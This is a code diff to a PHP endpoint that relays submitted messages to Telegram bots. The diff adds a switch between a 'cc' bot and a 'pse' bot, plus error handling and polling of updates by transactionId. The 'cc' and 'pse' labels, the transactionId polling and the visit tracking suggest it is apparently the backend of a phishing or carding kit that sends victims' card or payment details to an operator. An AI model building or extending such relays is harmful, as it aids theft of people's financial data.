@@ -3,17 +3,48 @@ require_once __DIR__ . '/visit_handler.php';
 header('Content-Type: application/json');
 require_once __DIR__ . '/config.php';
 
-$token = $telegram_config['token'];
-$chat_id = $telegram_config['chat_id'];
+// Helper to load cc config when needed
+function load_cc_config() {
+    $ccConfigPath = __DIR__ . '/data-cc/config.php';
+    if (file_exists($ccConfigPath)) {
+        return include $ccConfigPath; // returns ['bot_token' => ..., 'chat_id' => ...]
+    }
+    return null;
+}
 
 $action = $_GET['action'] ?? 'sendMessage';
 
-if ($action === 'sendMessage') {
-    $inputJSON = file_get_contents('php://input');
-    $input = json_decode($inputJSON, true);
+// Read input once for possible target info
+$inputJSON = file_get_contents('php://input');
+$input = json_decode($inputJSON, true);
 
+// Determine target: priority -> GET param 'target' over input 'target'.
+$target = strtolower(trim($_GET['target'] ?? ($input['target'] ?? '')));
+
+// Default token/chat from root config (used historically for "pse")
+$token = $telegram_config['token'] ?? null;
+$chat_id = $telegram_config['chat_id'] ?? null;
+
+// If target indicates cc, load data-cc config
+if ($target === 'cc') {
+    $cc = load_cc_config();
+    if ($cc && isset($cc['bot_token'], $cc['chat_id'])) {
+        $token = $cc['bot_token'];
+        $chat_id = $cc['chat_id'];
+    }
+} elseif ($target === 'pse') {
+    // explicit pse -> use root telegram_config (already default)
+    // nothing to change, but kept for clarity
+}
+
+if ($action === 'sendMessage') {
     if (!$input || !isset($input['message'])) {
         echo json_encode(['status' => 'error', 'message' => 'Invalid request']);
+        exit;
+    }
+
+    if (!$token || !$chat_id) {
+        echo json_encode(['status' => 'error', 'message' => 'Telegram token/chat not configured for target']);
         exit;
     }
 
@@ -34,7 +65,13 @@ if ($action === 'sendMessage') {
     curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
     $response = curl_exec($ch);
+    $curlErr = curl_error($ch);
     curl_close($ch);
+
+    if ($response === false || $response === null) {
+        echo json_encode(['status' => 'error', 'message' => 'curl error', 'detail' => $curlErr]);
+        exit;
+    }
 
     echo $response;
 } elseif ($action === 'getUpdates') {
@@ -42,6 +79,11 @@ if ($action === 'sendMessage') {
 
     if (!$transactionId) {
         echo json_encode(['status' => 'error', 'message' => 'transactionId required']);
+        exit;
+    }
+
+    if (!$token) {
+        echo json_encode(['status' => 'error', 'message' => 'Telegram token not configured for target']);
         exit;
     }
 
